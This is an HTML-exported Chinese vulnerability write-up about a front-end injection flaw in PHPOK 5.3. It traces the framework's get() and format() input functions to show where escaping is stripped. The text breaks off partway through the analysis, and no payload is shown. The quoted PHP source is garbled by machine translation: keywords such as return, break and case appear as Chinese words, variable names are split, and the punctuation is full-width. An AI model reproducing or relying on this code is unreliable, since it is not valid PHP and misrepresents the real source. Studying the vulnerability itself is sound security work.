<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="phpok-53-前台注入"><span class="csDE05BCC">PHPOK 5.3 </span><span class="csECDA2D3">前台注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">PHPOK 5.3</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">灵活获取参数：</span><span class="cs8926E06">$this-&gt;get()</span><span class="cs9C1B1871">方法</span></p><p class="cs40DD2BC9"><span class="cs8926E06">framework / init.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">get</span></p><p class="cs3A447A38"><span class="cs7FFD2630">最后的公共函数</span><span class="cs9FB05234">get</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ id</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ type =&ldquo; safe&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ ext =&ldquo;&rdquo;</span><span class="cs7FFD2630">）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// PGC</span><span class="cs7FFD2630">进入获取</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ val = isset</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ _ POST [$ id]</span><span class="cs7FFD2630">）？</span><span class="cs9FB05234">$ _POST [$ id]</span><span class="cs7FFD2630">：（</span><span class="cs9FB05234">isset</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ _ GET [$ id]</span><span class="cs7FFD2630">）？</span><span class="cs9FB05234">$ _GET [$ id]</span><span class="cs7FFD2630">：（</span><span class="cs9FB05234">isset</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ _ COOKIE [$ id]</span><span class="cs7FFD2630">）？</span><span class="cs9FB05234">$ _COOKIE [$ id]</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">&#39;&#39;</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ val ==&#39;&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ type ==&#39;int&#39;|| $ type ==&#39;intval&#39;|| $ type ==&#39;float&#39;|| $ type ==&#39;floatval&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">0 ; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else { </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&rdquo;; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">判断内容是否有转义，所有未转义的数据都直接转义</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ addslashes = false; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">function_exists</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo; get_magic_quotes_gpc&rdquo;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">&amp;&amp; get_magic_quotes_gpc</span><span class="cs7FFD2630">（））</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ addslashes = true; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（！</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ addslashes</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ $ val = $ this-&gt; _ addslashes</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ val</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">$ this-&gt; format</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ val</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ type</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ ext</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06">format</span><span class="cs9C1B1871">函数：</span><span class="cs8926E06">framework / init.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">format</span></p><p class="cs3A447A38"><span class="cs7FFD2630">最终的公共函数格式（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ type =&ldquo; safe&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ ext =&ldquo;&rdquo;</span><span class="cs7FFD2630">）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg ==&ldquo;&rdquo;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return ;; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">is_array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg as $ key =&gt; $ value</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（！</span><span class="cs9FB05234">is_numeric</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ key</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ key2 = $ this-&gt; format</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ key</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ key2 ==``|| in_array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ key2</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">＃</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">＆</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">％</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">）））</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg [$ key]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">继续</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg [$ key] = $ this-&gt; format</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ value</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ type</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ ext</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg &amp;&amp; count</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">&gt; 0</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">$ msg; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">false; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ type ==&#39;html_js&#39;||</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ type ==&#39;html&#39;&amp;&amp; $ ext</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = stripslashes</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ this-&gt; app_id</span><span class="cs7FFD2630">！</span><span class="cs9FB05234">=&#39;admin&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = $ this-&gt; lib</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;string&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; xss_clean</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = $ this-&gt; lib</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;string&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; clear_url</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ this-&gt; url</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">addslashes</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">转义去除</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ msg = stripslashes</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">格式化处理内容</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">开关（</span><span class="cs9FB05234">$ type</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&#39;safe_text&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = strip_tags</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = str_replace</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo; \\&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&ldquo;&#39;&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;&ldquo;&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&rdquo; &lt;&ldquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&rdquo;&gt;&ldquo;</span><span class="cs7FFD2630">），</span><span class="cs9FB05234">&#39;&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;system&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg =</span><span class="cs7FFD2630">！</span><span class="cs9FB05234">preg_match</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo; / ^ [a-zA-Z] [a-z0-9A-Z \ _ \-] + $ / u&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）吗？</span><span class="cs9FB05234">false</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">$ msg;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;id&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg =</span><span class="cs7FFD2630">！</span><span class="cs9FB05234">preg_match</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo; / ^ [a-zA-Z] [a-z0-9A-Z \ _ \-] + $ / u&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）吗？</span><span class="cs9FB05234">false</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">$ msg; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">复选框</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = strtolower</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">==&#39;on&#39;</span><span class="cs7FFD2630">吗？</span><span class="cs9FB05234">1</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">$ this-&gt; format</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;safe&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;int&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = intval</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;intval&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = intval</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;float&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = floatval</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;floatval&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = floatval</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">案例</span><span class="cs9FB05234">&ldquo;</span><span class="cs7FFD2630">时间</span><span class="cs9FB05234">&rdquo;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;html&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = $ this-&gt; lib</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;string&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; safe_html</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ this-&gt; url</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;func&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = function_exists</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ ext</span><span class="cs7FFD2630">）？</span><span class="cs9FB05234">$ ext</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）：假</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">情况</span><span class="cs9FB05234">&#39;text&#39;</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = strip_tags</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">打破</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 